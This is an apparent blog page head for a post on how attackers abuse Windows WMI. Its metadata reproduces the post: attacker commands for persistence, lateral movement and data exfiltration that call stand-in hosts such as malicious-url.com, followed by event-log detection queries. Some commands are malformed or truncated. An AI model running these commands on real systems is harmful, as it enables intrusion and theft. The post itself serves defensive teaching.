@@ -1,0 +1,780 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="https://unpkg.com/purecss@2.0.3/build/pure-min.css"
+    integrity="sha384-cg6SkqEOCV1NbJoCu11+bm0NvBRc8IYLRGXkmNrqUBfTjmMYwNKPWBTIKyw9mHNJ" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://unpkg.com/purecss@2.0.3/build/grids-responsive-min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <link rel="stylesheet" href="/assets/styles.css"><!-- Begin Jekyll SEO tag v2.8.0 -->
+  <title>How the attacker abuses WMI | Ahmed Khalifa</title>
+  <meta name="generator" content="Jekyll v4.4.1" />
+  <meta property="og:title" content="How the attacker abuses WMI" />
+  <meta name="author" content="Ahmed Khalifa" />
+  <meta property="og:locale" content="en" />
+  <meta name="description"
+    content="WMI Event Subscription (Persistence) What it is: Attackers create WMI event subscriptions to execute malicious actions based on system events, like startup or user logon, ensuring persistence. How it works: Attackers create __EventFilter and __EventConsumer to trigger actions when system events occur. Example: An attacker can create an event filter using WMI to execute a PowerShell script upon system startup, maintaining persistence even after reboots. Command: $filter = [wmiclass]&quot;\\localhost\root\cimv2:__EventFilter&quot; $consumer = [wmiclass]&quot;\\localhost\root\cimv2:__EventConsumer&quot; $action = &quot;powershell.exe -ExecutionPolicy Bypass -NoLogo -NoProfile -WindowStyle Hidden -Command Invoke-Expression (New-Object Net.WebClient).DownloadString(&#39;http://malicious-url.com/payload.ps1&#39;)&quot; WMI Remote Execution (Lateral Movement) What it is: Attackers use WMI to execute commands remotely on other systems, facilitating lateral movement across the network without needing traditional remote access protocols. How it works: Tools like wmic or PowerShell’s Invoke-WmiMethod execute commands remotely on other systems within the network. Example: An attacker uses wmic to execute a command on a remote system that downloads and executes a malicious payload. Command: wmic /node:TargetSystem process call create &quot;powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Invoke-WebRequest &#39;http://malicious-url.com/payload.exe&#39; -OutFile &#39;C:\Windows\Temp\payload.exe&#39;; Start-Process &#39;C:\Windows\Temp\payload.exe&#39; WMI as a Backdoor (Persistence) What it is: Attackers install a backdoor via WMI to maintain control over the compromised system even after reboots. How it works: WMI is used to execute commands remotely, typically opening a reverse shell or enabling further exploitation. Example: An attacker uses WMI to execute a PowerShell script that opens a reverse shell back to the attacker’s server. Command: Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList &quot;powershell.exe -Command Invoke-WebRequest &#39;http://malicious-url.com/reverse-shell.ps1&#39; -OutFile &#39;C:\Windows\Temp\reverse-shell.ps1&#39;; C:\Windows\Temp\reverse-shell.ps1&quot; WMI for Pivoting (Lateral Movement) What it is: After compromising one system, attackers use WMI to move laterally to other systems, expanding the attack footprint across the network. How it works: Attackers leverage WMI to execute commands on additional systems, further escalating privileges and spreading across the network. Example: An attacker uses WMI to run commands on a target machine to download and execute malware from a remote server. Command: wmic /node:TargetSystem process call create &quot;powershell.exe -Command Invoke-WebRequest &#39;http://malicious-url.com/malware.exe&#39; -OutFile &#39;C:\Windows\Temp\malware.exe&#39;; Start-Process &#39;C:\Windows\Temp\malware.exe&#39;&quot; WMI Scheduled Task Creation (Persistence) What it is: Attackers use WMI to create scheduled tasks that ensure malicious payloads are executed at specific times or events, such as system reboot or user logon. How it works: WMI schedules tasks that trigger malicious scripts or binaries at system startup or user logon. Example: An attacker creates a scheduled task using WMI that runs a malicious PowerShell script every time a user logs on to the system. Command: $task = [wmiclass]&quot;\\localhost\root\cimv2:Win32_ScheduledJob&quot; $task.Create(&quot;powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Invoke-WebRequest &#39;http://malicious-url.com/payload.ps1&#39; -OutFile &#39;C:\Windows\Temp\payload.ps1&#39;; Start-Process &#39;C:\Windows\Temp\payload.ps1&#39;&quot;) WMI for Remote Code Execution (RCE) What it is: Attackers use WMI to remotely execute arbitrary code on another system without requiring traditional administrative access. How it works: WMI allows attackers to trigger remote execution of code, bypassing traditional defenses like firewalls and remote access tools. Example: An attacker remotely runs a malicious executable or PowerShell script using WMI. Command: Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList &quot;cmd.exe /c http://malicious-url.com/malware.exe WMI Event Filters for Data Exfiltration What it is: Attackers use WMI event filters to capture system or user data and send it to an external server for exfiltration. How it works: WMI event subscriptions are set up to monitor system events (e.g., file creation) and send sensitive data to an attacker-controlled server. Example: An attacker sets up a WMI event subscription to trigger on file creation and then sends a copy of sensitive files to an external server. Command: $eventFilter = [wmiclass]&quot;\\localhost\root\cimv2:__EventFilter&quot; $eventConsumer = [wmiclass]&quot;\\localhost\root\cimv2:__EventConsumer&quot; $action = &quot;powershell.exe -Command Invoke-WebRequest -Uri &#39;http://malicious-url.com/upload&#39; -Method POST -Body (Get-Content &#39;C:\Users\victim\Documents\important.txt&#39;)&quot; WMI for Manipulating Services (Persistence) What it is: Attackers use WMI to create or manipulate services that ensure persistence or further exploitation on the compromised system. How it works: WMI can be used to create new services or manipulate existing ones, allowing attackers to execute malicious code on system startup or other specified conditions. Example: An attacker uses WMI to create a new service that runs a malicious payload each time the system starts. Command: $service = Get-WmiObject -Class Win32_Service -Filter &quot;Name=&#39;MyMaliciousService&#39;&quot; $service.Create(&quot;C:\Windows\Temp\payload.exe&quot;, &quot;MaliciousService&quot;, &quot;auto&quot;, &quot;localSystem&quot;, &quot;C:\Windows\Temp\payload.exe&quot;) WMI for Creating Backdoor Network Connections What it is: Attackers use WMI to create network connections that serve as backdoors for remote access. How it works: WMI can be used to initiate network connections, allowing attackers to maintain control of the compromised system or exfiltrate data. Example: An attacker uses WMI to invoke commands that create network connections to attacker-controlled servers. Command: Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList &quot;cmd.exe /c start [http://attacker-controlled-url.com/reverse-shell.ex](http://attacker-controlled-url.com/reverse-shell.exe)e WMI for Credential Dumping (Lateral Movement) What it is: Attackers use WMI to gather and exfiltrate credentials or password hashes from compromised systems to facilitate lateral movement. How it works: WMI scripts are used to extract credentials, password hashes, or other sensitive data from systems. Example: An attacker uses WMI to dump credentials from the Windows SAM or LSASS memory. Command: Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList &quot;powershell.exe -Command Invoke-WebRequest &#39;http://malicious-url.com/exfiltrate-credentials.ps1&#39; -OutFile &#39;C:\Windows\Temp\credentials.ps1&#39;&quot; WMI to Modify Registry Keys (Persistence) What it is: Attackers use WMI to modify registry keys to execute malicious payloads on system startup. How it works: WMI can be used to modify the Windows registry, ensuring malicious programs are run when the system boots up. Example: An attacker modifies a registry key via WMI to run a malicious application on system startup. Commannd: Invoke-WmiMethod -Class Win32_Registry -Name Create -ArgumentList &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot;, &quot;MyMaliciousApp&quot;, &quot;C:\Windows\Temp\payload.exe&quot; WMI for Triggering Malicious PowerShell Scripts What it is: Attackers use WMI to remotely execute malicious PowerShell scripts, which are often used to download additional tools or payloads. How it works: PowerShell scripts can be invoked via WMI as part of the attack chain to download and execute malicious code. Example: An attacker uses WMI to invoke a PowerShell script that downloads additional tools from an external server. Command: Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList &quot;powershell.exe -ExecutionPolicy Bypass WMI for Rootkit Installation (Persistence) Explanation: Attackers leverage WMI to install rootkits or alter system components to maintain control and avoid detection, often evading traditional security tools. Detection: Event ID 4688: Monitors process creation, including those associated with malicious rootkits. Event ID 7045: Tracks service installations, which could include services related to rootkits. Example Detection: Watch for process creation and service installation events related to rootkit files. Get-WinEvent -LogName &quot;System&quot; | Where-Object { $_.Id -eq 7045 -and $_.Message -like &quot;*rootkit*&quot; } Rationale: Rootkits installed via WMI are stealthy. Monitoring for new processes and services associated with rootkit behavior can help identify this persistence technique. Lets Move TO The Detection Part WMI for Modifying Event Logs (Evading Detection) Explanation: Attackers use WMI to modify, delete, or suppress event logs to cover up their actions, making it harder to trace their activities. Detection: Event ID 19: Tracks the modification of WMI event subscriptions, which might be used to hide log alterations. Event ID 10: Monitors WMI command execution, including potential log modification actions. Example Detection: Correlate WMI execution events with any suspicious log deletions or modifications. Get-WinEvent -LogName &quot;Security&quot; | Where-Object { $_.Id -eq 19 } Rationale: Modifying event logs through WMI can be a strong indication of an attacker trying to cover their tracks. Monitoring for WMI-related modifications helps detect this technique. WMI Event Subscription (Persistence) Explanation: WMI event subscriptions are used by attackers to establish a backdoor on a system. These subscriptions can trigger malicious actions when certain system events occur. Detection: Event ID 19: Indicates the creation or modification of WMI event subscriptions. Event ID 10: Logs WMI executions, often linked to scripts or processes that are triggered by event subscriptions. Example Detection: Monitor for event subscription creation and WMI execution, especially when tied to system events. Get-WinEvent -LogName &quot;Security&quot; | Where-Object { $_.Id -eq 19 } Rationale: Persistent backdoors created via WMI event subscriptions can survive reboots. Tracking these events helps detect unauthorized persistence mechanisms. WMI Remote Execution (Lateral Movement) Explanation: WMI is often used for remote command execution across the network, allowing attackers to move laterally without triggering traditional remote administration tools. Detection: Event ID 4688: Monitors process creation, which includes remote executions via WMI. Event ID 4648: Detects logon attempts that use explicit credentials, signaling potential lateral movement. Example Detection: Watch for the execution of wmic or PowerShell, which can indicate WMI-based lateral movement. Get-WinEvent -LogName &quot;Security&quot; | Where-Object { $_.Id -eq 4688 -and $_.Message -like &quot;*wmic*&quot; } Rationale: Remote execution and lateral movement using WMI can bypass traditional security defenses. Monitoring for these events can reveal suspicious lateral activity across the network. WMI as a Backdoor (Persistence) Explanation: WMI can be used to establish a persistent backdoor, which can survive system reboots. Attackers might install malicious scripts or binaries that are triggered by certain system events. Detection: Event ID 4688: Tracks process creation, which may reveal WMI-based backdoor executables. Event ID 7045: Monitors service installations, which may include malicious services created through WMI for persistence. Example Detection: Investigate new processes or services that might indicate a backdoor established via WMI. Get-WinEvent -LogName &quot;System&quot; | Where-Object { $_.Id -eq 7045 -and $_.Message -like &quot;*maliciousservice*&quot; } Rationale: Backdoors set up using WMI can persist even after a reboot. Service creation and process execution tied to WMI commands help detect backdoor persistence. WMI for Pivoting (Lateral Movement) Explanation: WMI is a useful tool for pivoting across the network, allowing attackers to move between systems without relying on traditional remote administration tools like RDP. Detection: Event ID 4688: Detects suspicious process execution, especially when WMI-related commands like wmic are invoked remotely. Event ID 4648: Monitors logon events, particularly those indicating credential use for lateral movement. Example Detection: Correlate remote execution events with unusual logon attempts or suspicious processes. Get-WinEvent -LogName &quot;Security&quot; | Where-Object { $_.Id -eq 4688 -and $_.Message -like &quot;*wmic*&quot; } Rationale: Pivoting via WMI can be harder to detect than using traditional tools. Monitoring for WMI executions across the network and correlating logon events is essential for identifying lateral movement. WMI Scheduled Task Creation (Persistence) Explanation: WMI can create or modify scheduled tasks that persist even through system reboots, allowing attackers to execute malicious scripts or binaries on a regular basis. Detection: Event ID 4697: Logs the installation of services that could be associated with scheduled task creation. Event ID 10: Tracks WMI executions that might relate to scheduled task creation or manipulation. Example Detection: Watch for task creation events and any associated WMI-based execution that may signal scheduled tasks for persistence. Get-WinEvent -LogName &quot;Security&quot; | Where-Object { $_.Id -eq 4697 } Rationale: Scheduled tasks created via WMI allow attackers to run scripts persistently. Monitoring these events can reveal persistence mechanisms set by attackers. WMI for Remote Code Execution (RCE) Explanation: WMI can be leveraged to execute arbitrary code remotely, enabling attackers to bypass security controls and run commands without needing direct access to the system. Detection: Event ID 4688: Monitors process creation for remote code execution via WMI (e.g., PowerShell, wmic). Event ID 10: Tracks WMI command executions that could indicate remote code execution. Example Detection: Correlate suspicious remote code execution events through WMI with unusual network activity or file modifications. Get-WinEvent -LogName &quot;Security&quot; | Where-Object { $_.Id -eq 4688 -and $_.Message -like &quot;*powershell.exe*&quot; } Rationale: Remote code execution via WMI bypasses traditional defenses. Monitoring for this kind of activity can help detect malicious use of WMI for arbitrary code execution. WMI Event Filters for Data Exfiltration Explanation: Event filters can be used by attackers to monitor system activity and exfiltrate data, such as sending logs or files to an external server. Detection: Event ID 10: Logs WMI execution, which might indicate data exfiltration-related actions. Event ID 19: Detects the creation of WMI event filters, which could be set up to capture and send system data. Example Detection: Investigate WMI event filters and correlate them with network traffic indicating potential data exfiltration. Get-WinEvent -LogName &quot;Security&quot; | Where-Object { $_.Id -eq 10 } Rationale: Data exfiltration via WMI event filters can be stealthy. Monitoring these events alongside network traffic can help detect such attacks. WMI for Manipulating Services (Persistence) Explanation: Attackers may use WMI to manipulate or install services that provide persistence on a system or escalate privileges. Detection: Event ID 7045: Service creation or modification, potentially related to malicious services installed via WMI. Event ID 4688: Tracks the execution of commands related to service manipulation through WMI. Example Detection: Monitor for the creation or modification of services and correlating WMI command executions. Get-WinEvent -LogName &quot;System&quot; | Where-Object { $_.Id -eq 7045 -and $_.Message -like &quot;*maliciousservice*&quot; } Rationale: WMI is a versatile tool for manipulating services. Monitoring for service installations and WMI execution can help detect attackers establishing persistence via services. WMI for Triggering Malicious PowerShell Scripts Explanation: Attackers often use WMI to trigger malicious PowerShell scripts that can perform actions like downloading malware or exfiltrating data. Detection: Event ID 4688: Tracks the creation of processes, particularly PowerShell or suspicious scripts triggered via WMI. Event ID 4104: PowerShell script block logging, which can reveal the contents of malicious scripts. Example Detection: Correlate PowerShell execution events with suspicious network activity or file modifications to detect malicious scripts triggered by WMI. Get-WinEvent -LogName &quot;Security&quot; | Where-Object { $_.Id -eq 4688 -and $_.Message -like &quot;*powershell.exe*&quot; } Rationale: PowerShell is commonly used for malicious purposes in WMI-based attacks. Monitoring PowerShell executions and script block logging can help detect such malicious activities." />
+  <meta property="og:description"
+    content="WMI Event Subscription (Persistence) What it is: Attackers create WMI event subscriptions to execute malicious actions based on system events, like startup or user logon, ensuring persistence. How it works: Attackers create __EventFilter and __EventConsumer to trigger actions when system events occur. Example: An attacker can create an event filter using WMI to execute a PowerShell script upon system startup, maintaining persistence even after reboots. Command: $filter = [wmiclass]&quot;\\localhost\root\cimv2:__EventFilter&quot; $consumer = [wmiclass]&quot;\\localhost\root\cimv2:__EventConsumer&quot; $action = &quot;powershell.exe -ExecutionPolicy Bypass -NoLogo -NoProfile -WindowStyle Hidden -Command Invoke-Expression (New-Object Net.WebClient).DownloadString(&#39;http://malicious-url.com/payload.ps1&#39;)&quot; WMI Remote Execution (Lateral Movement) What it is: Attackers use WMI to execute commands remotely on other systems, facilitating lateral movement across the network without needing traditional remote access protocols. How it works: Tools like wmic or PowerShell’s Invoke-WmiMethod execute commands remotely on other systems within the network. Example: An attacker uses wmic to execute a command on a remote system that downloads and executes a malicious payload. Command: wmic /node:TargetSystem process call create &quot;powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Invoke-WebRequest &#39;http://malicious-url.com/payload.exe&#39; -OutFile &#39;C:\Windows\Temp\payload.exe&#39;; Start-Process &#39;C:\Windows\Temp\payload.exe&#39; WMI as a Backdoor (Persistence) What it is: Attackers install a backdoor via WMI to maintain control over the compromised system even after reboots. How it works: WMI is used to execute commands remotely, typically opening a reverse shell or enabling further exploitation. Example: An attacker uses WMI to execute a PowerShell script that opens a reverse shell back to the attacker’s server. Command: Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList &quot;powershell.exe -Command Invoke-WebRequest &#39;http://malicious-url.com/reverse-shell.ps1&#39; -OutFile &#39;C:\Windows\Temp\reverse-shell.ps1&#39;; C:\Windows\Temp\reverse-shell.ps1&quot; WMI for Pivoting (Lateral Movement) What it is: After compromising one system, attackers use WMI to move laterally to other systems, expanding the attack footprint across the network. How it works: Attackers leverage WMI to execute commands on additional systems, further escalating privileges and spreading across the network. Example: An attacker uses WMI to run commands on a target machine to download and execute malware from a remote server. Command: wmic /node:TargetSystem process call create &quot;powershell.exe -Command Invoke-WebRequest &#39;http://malicious-url.com/malware.exe&#39; -OutFile &#39;C:\Windows\Temp\malware.exe&#39;; Start-Process &#39;C:\Windows\Temp\malware.exe&#39;&quot; WMI Scheduled Task Creation (Persistence) What it is: Attackers use WMI to create scheduled tasks that ensure malicious payloads are executed at specific times or events, such as system reboot or user logon. How it works: WMI schedules tasks that trigger malicious scripts or binaries at system startup or user logon. Example: An attacker creates a scheduled task using WMI that runs a malicious PowerShell script every time a user logs on to the system. Command: $task = [wmiclass]&quot;\\localhost\root\cimv2:Win32_ScheduledJob&quot; $task.Create(&quot;powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Invoke-WebRequest &#39;http://malicious-url.com/payload.ps1&#39; -OutFile &#39;C:\Windows\Temp\payload.ps1&#39;; Start-Process &#39;C:\Windows\Temp\payload.ps1&#39;&quot;) WMI for Remote Code Execution (RCE) What it is: Attackers use WMI to remotely execute arbitrary code on another system without requiring traditional administrative access. How it works: WMI allows attackers to trigger remote execution of code, bypassing traditional defenses like firewalls and remote access tools. Example: An attacker remotely runs a malicious executable or PowerShell script using WMI. Command: Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList &quot;cmd.exe /c http://malicious-url.com/malware.exe WMI Event Filters for Data Exfiltration What it is: Attackers use WMI event filters to capture system or user data and send it to an external server for exfiltration. How it works: WMI event subscriptions are set up to monitor system events (e.g., file creation) and send sensitive data to an attacker-controlled server. Example: An attacker sets up a WMI event subscription to trigger on file creation and then sends a copy of sensitive files to an external server. Command: $eventFilter = [wmiclass]&quot;\\localhost\root\cimv2:__EventFilter&quot; $eventConsumer = [wmiclass]&quot;\\localhost\root\cimv2:__EventConsumer&quot; $action = &quot;powershell.exe -Command Invoke-WebRequest -Uri &#39;http://malicious-url.com/upload&#39; -Method POST -Body (Get-Content &#39;C:\Users\victim\Documents\important.txt&#39;)&quot; WMI for Manipulating Services (Persistence) What it is: Attackers use WMI to create or manipulate services that ensure persistence or further exploitation on the compromised system. How it works: WMI can be used to create new services or manipulate existing ones, allowing attackers to execute malicious code on system startup or other specified conditions. Example: An attacker uses WMI to create a new service that runs a malicious payload each time the system starts. Command: $service = Get-WmiObject -Class Win32_Service -Filter &quot;Name=&#39;MyMaliciousService&#39;&quot; $service.Create(&quot;C:\Windows\Temp\payload.exe&quot;, &quot;MaliciousService&quot;, &quot;auto&quot;, &quot;localSystem&quot;, &quot;C:\Windows\Temp\payload.exe&quot;) WMI for Creating Backdoor Network Connections What it is: Attackers use WMI to create network connections that serve as backdoors for remote access. How it works: WMI can be used to initiate network connections, allowing attackers to maintain control of the compromised system or exfiltrate data. Example: An attacker uses WMI to invoke commands that create network connections to attacker-controlled servers. Command: Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList &quot;cmd.exe /c start [http://attacker-controlled-url.com/reverse-shell.ex](http://attacker-controlled-url.com/reverse-shell.exe)e WMI for Credential Dumping (Lateral Movement) What it is: Attackers use WMI to gather and exfiltrate credentials or password hashes from compromised systems to facilitate lateral movement. How it works: WMI scripts are used to extract credentials, password hashes, or other sensitive data from systems. Example: An attacker uses WMI to dump credentials from the Windows SAM or LSASS memory. Command: Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList &quot;powershell.exe -Command Invoke-WebRequest &#39;http://malicious-url.com/exfiltrate-credentials.ps1&#39; -OutFile &#39;C:\Windows\Temp\credentials.ps1&#39;&quot; WMI to Modify Registry Keys (Persistence) What it is: Attackers use WMI to modify registry keys to execute malicious payloads on system startup. How it works: WMI can be used to modify the Windows registry, ensuring malicious programs are run when the system boots up. Example: An attacker modifies a registry key via WMI to run a malicious application on system startup. Commannd: Invoke-WmiMethod -Class Win32_Registry -Name Create -ArgumentList &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot;, &quot;MyMaliciousApp&quot;, &quot;C:\Windows\Temp\payload.exe&quot; WMI for Triggering Malicious PowerShell Scripts What it is: Attackers use WMI to remotely execute malicious PowerShell scripts, which are often used to download additional tools or payloads. How it works: PowerShell scripts can be invoked via WMI as part of the attack chain to download and execute malicious code. Example: An attacker uses WMI to invoke a PowerShell script that downloads additional tools from an external server. Command: Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList &quot;powershell.exe -ExecutionPolicy Bypass WMI for Rootkit Installation (Persistence) Explanation: Attackers leverage WMI to install rootkits or alter system components to maintain control and avoid detection, often evading traditional security tools. Detection: Event ID 4688: Monitors process creation, including those associated with malicious rootkits. Event ID 7045: Tracks service installations, which could include services related to rootkits. Example Detection: Watch for process creation and service installation events related to rootkit files. Get-WinEvent -LogName &quot;System&quot; | Where-Object { $_.Id -eq 7045 -and $_.Message -like &quot;*rootkit*&quot; } Rationale: Rootkits installed via WMI are stealthy. Monitoring for new processes and services associated with rootkit behavior can help identify this persistence technique. Lets Move TO The Detection Part WMI for Modifying Event Logs (Evading Detection) Explanation: Attackers use WMI to modify, delete, or suppress event logs to cover up their actions, making it harder to trace their activities. Detection: Event ID 19: Tracks the modification of WMI event subscriptions, which might be used to hide log alterations. Event ID 10: Monitors WMI command execution, including potential log modification actions. Example Detection: Correlate WMI execution events with any suspicious log deletions or modifications. Get-WinEvent -LogName &quot;Security&quot; | Where-Object { $_.Id -eq 19 } Rationale: Modifying event logs through WMI can be a strong indication of an attacker trying to cover their tracks. Monitoring for WMI-related modifications helps detect this technique. WMI Event Subscription (Persistence) Explanation: WMI event subscriptions are used by attackers to establish a backdoor on a system. These subscriptions can trigger malicious actions when certain system events occur. Detection: Event ID 19: Indicates the creation or modification of WMI event subscriptions. Event ID 10: Logs WMI executions, often linked to scripts or processes that are triggered by event subscriptions. Example Detection: Monitor for event subscription creation and WMI execution, especially when tied to system events. Get-WinEvent -LogName &quot;Security&quot; | Where-Object { $_.Id -eq 19 } Rationale: Persistent backdoors created via WMI event subscriptions can survive reboots. Tracking these events helps detect unauthorized persistence mechanisms. WMI Remote Execution (Lateral Movement) Explanation: WMI is often used for remote command execution across the network, allowing attackers to move laterally without triggering traditional remote administration tools. Detection: Event ID 4688: Monitors process creation, which includes remote executions via WMI. Event ID 4648: Detects logon attempts that use explicit credentials, signaling potential lateral movement. Example Detection: Watch for the execution of wmic or PowerShell, which can indicate WMI-based lateral movement. Get-WinEvent -LogName &quot;Security&quot; | Where-Object { $_.Id -eq 4688 -and $_.Message -like &quot;*wmic*&quot; } Rationale: Remote execution and lateral movement using WMI can bypass traditional security defenses. Monitoring for these events can reveal suspicious lateral activity across the network. WMI as a Backdoor (Persistence) Explanation: WMI can be used to establish a persistent backdoor, which can survive system reboots. Attackers might install malicious scripts or binaries that are triggered by certain system events. Detection: Event ID 4688: Tracks process creation, which may reveal WMI-based backdoor executables. Event ID 7045: Monitors service installations, which may include malicious services created through WMI for persistence. Example Detection: Investigate new processes or services that might indicate a backdoor established via WMI. Get-WinEvent -LogName &quot;System&quot; | Where-Object { $_.Id -eq 7045 -and $_.Message -like &quot;*maliciousservice*&quot; } Rationale: Backdoors set up using WMI can persist even after a reboot. Service creation and process execution tied to WMI commands help detect backdoor persistence. WMI for Pivoting (Lateral Movement) Explanation: WMI is a useful tool for pivoting across the network, allowing attackers to move between systems without relying on traditional remote administration tools like RDP. Detection: Event ID 4688: Detects suspicious process execution, especially when WMI-related commands like wmic are invoked remotely. Event ID 4648: Monitors logon events, particularly those indicating credential use for lateral movement. Example Detection: Correlate remote execution events with unusual logon attempts or suspicious processes. Get-WinEvent -LogName &quot;Security&quot; | Where-Object { $_.Id -eq 4688 -and $_.Message -like &quot;*wmic*&quot; } Rationale: Pivoting via WMI can be harder to detect than using traditional tools. Monitoring for WMI executions across the network and correlating logon events is essential for identifying lateral movement. WMI Scheduled Task Creation (Persistence) Explanation: WMI can create or modify scheduled tasks that persist even through system reboots, allowing attackers to execute malicious scripts or binaries on a regular basis. Detection: Event ID 4697: Logs the installation of services that could be associated with scheduled task creation. Event ID 10: Tracks WMI executions that might relate to scheduled task creation or manipulation. Example Detection: Watch for task creation events and any associated WMI-based execution that may signal scheduled tasks for persistence. Get-WinEvent -LogName &quot;Security&quot; | Where-Object { $_.Id -eq 4697 } Rationale: Scheduled tasks created via WMI allow attackers to run scripts persistently. Monitoring these events can reveal persistence mechanisms set by attackers. WMI for Remote Code Execution (RCE) Explanation: WMI can be leveraged to execute arbitrary code remotely, enabling attackers to bypass security controls and run commands without needing direct access to the system. Detection: Event ID 4688: Monitors process creation for remote code execution via WMI (e.g., PowerShell, wmic). Event ID 10: Tracks WMI command executions that could indicate remote code execution. Example Detection: Correlate suspicious remote code execution events through WMI with unusual network activity or file modifications. Get-WinEvent -LogName &quot;Security&quot; | Where-Object { $_.Id -eq 4688 -and $_.Message -like &quot;*powershell.exe*&quot; } Rationale: Remote code execution via WMI bypasses traditional defenses. Monitoring for this kind of activity can help detect malicious use of WMI for arbitrary code execution. WMI Event Filters for Data Exfiltration Explanation: Event filters can be used by attackers to monitor system activity and exfiltrate data, such as sending logs or files to an external server. Detection: Event ID 10: Logs WMI execution, which might indicate data exfiltration-related actions. Event ID 19: Detects the creation of WMI event filters, which could be set up to capture and send system data. Example Detection: Investigate WMI event filters and correlate them with network traffic indicating potential data exfiltration. Get-WinEvent -LogName &quot;Security&quot; | Where-Object { $_.Id -eq 10 } Rationale: Data exfiltration via WMI event filters can be stealthy. Monitoring these events alongside network traffic can help detect such attacks. WMI for Manipulating Services (Persistence) Explanation: Attackers may use WMI to manipulate or install services that provide persistence on a system or escalate privileges. Detection: Event ID 7045: Service creation or modification, potentially related to malicious services installed via WMI. Event ID 4688: Tracks the execution of commands related to service manipulation through WMI. Example Detection: Monitor for the creation or modification of services and correlating WMI command executions. Get-WinEvent -LogName &quot;System&quot; | Where-Object { $_.Id -eq 7045 -and $_.Message -like &quot;*maliciousservice*&quot; } Rationale: WMI is a versatile tool for manipulating services. Monitoring for service installations and WMI execution can help detect attackers establishing persistence via services. WMI for Triggering Malicious PowerShell Scripts Explanation: Attackers often use WMI to trigger malicious PowerShell scripts that can perform actions like downloading malware or exfiltrating data. Detection: Event ID 4688: Tracks the creation of processes, particularly PowerShell or suspicious scripts triggered via WMI. Event ID 4104: PowerShell script block logging, which can reveal the contents of malicious scripts. Example Detection: Correlate PowerShell execution events with suspicious network activity or file modifications to detect malicious scripts triggered by WMI. Get-WinEvent -LogName &quot;Security&quot; | Where-Object { $_.Id -eq 4688 -and $_.Message -like &quot;*powershell.exe*&quot; } Rationale: PowerShell is commonly used for malicious purposes in WMI-based attacks. Monitoring PowerShell executions and script block logging can help detect such malicious activities." />
+  <link rel="canonical" href="http://0.0.0.0:4000/2025/05/02/How-the-attacker-abuses-WMI/" />
+  <meta property="og:url" content="http://0.0.0.0:4000/2025/05/02/How-the-attacker-abuses-WMI/" />
+  <meta property="og:site_name" content="Ahmed Khalifa" />
+  <meta property="og:type" content="article" />
+  <meta property="article:published_time" content="2025-05-02T10:32:00+03:00" />
+  <meta name="twitter:card" content="summary" />
+  <meta property="twitter:title" content="How the attacker abuses WMI" />
+  <meta name="twitter:site" content="@kh4lifa0x" />
+  <meta name="twitter:creator" content="@Ahmed Khalifa" />
+  <meta name="google-site-verification" content="xxxxx" />
+  <script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Ahmed Khalifa","url":"https://github.com/kh4lifa0x/"},"dateModified":"2025-05-02T10:32:00+03:00","datePublished":"2025-05-02T10:32:00+03:00","description":"WMI Event Subscription (Persistence) What it is: Attackers create WMI event subscriptions to execute malicious actions based on system events, like startup or user logon, ensuring persistence. How it works: Attackers create __EventFilter and __EventConsumer to trigger actions when system events occur. Example: An attacker can create an event filter using WMI to execute a PowerShell script upon system startup, maintaining persistence even after reboots. Command: $filter = [wmiclass]&quot;\\\\localhost\\root\\cimv2:__EventFilter&quot; $consumer = [wmiclass]&quot;\\\\localhost\\root\\cimv2:__EventConsumer&quot; $action = &quot;powershell.exe -ExecutionPolicy Bypass -NoLogo -NoProfile -WindowStyle Hidden -Command Invoke-Expression (New-Object Net.WebClient).DownloadString(&#39;http://malicious-url.com/payload.ps1&#39;)&quot; WMI Remote Execution (Lateral Movement) What it is: Attackers use WMI to execute commands remotely on other systems, facilitating lateral movement across the network without needing traditional remote access protocols. How it works: Tools like wmic or PowerShell’s Invoke-WmiMethod execute commands remotely on other systems within the network. Example: An attacker uses wmic to execute a command on a remote system that downloads and executes a malicious payload. Command: wmic /node:TargetSystem process call create &quot;powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Invoke-WebRequest &#39;http://malicious-url.com/payload.exe&#39; -OutFile &#39;C:\\Windows\\Temp\\payload.exe&#39;; Start-Process &#39;C:\\Windows\\Temp\\payload.exe&#39; WMI as a Backdoor (Persistence) What it is: Attackers install a backdoor via WMI to maintain control over the compromised system even after reboots. How it works: WMI is used to execute commands remotely, typically opening a reverse shell or enabling further exploitation. Example: An attacker uses WMI to execute a PowerShell script that opens a reverse shell back to the attacker’s server. Command: Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList &quot;powershell.exe -Command Invoke-WebRequest &#39;http://malicious-url.com/reverse-shell.ps1&#39; -OutFile &#39;C:\\Windows\\Temp\\reverse-shell.ps1&#39;; C:\\Windows\\Temp\\reverse-shell.ps1&quot; WMI for Pivoting (Lateral Movement) What it is: After compromising one system, attackers use WMI to move laterally to other systems, expanding the attack footprint across the network. How it works: Attackers leverage WMI to execute commands on additional systems, further escalating privileges and spreading across the network. Example: An attacker uses WMI to run commands on a target machine to download and execute malware from a remote server. Command: wmic /node:TargetSystem process call create &quot;powershell.exe -Command Invoke-WebRequest &#39;http://malicious-url.com/malware.exe&#39; -OutFile &#39;C:\\Windows\\Temp\\malware.exe&#39;; Start-Process &#39;C:\\Windows\\Temp\\malware.exe&#39;&quot; WMI Scheduled Task Creation (Persistence) What it 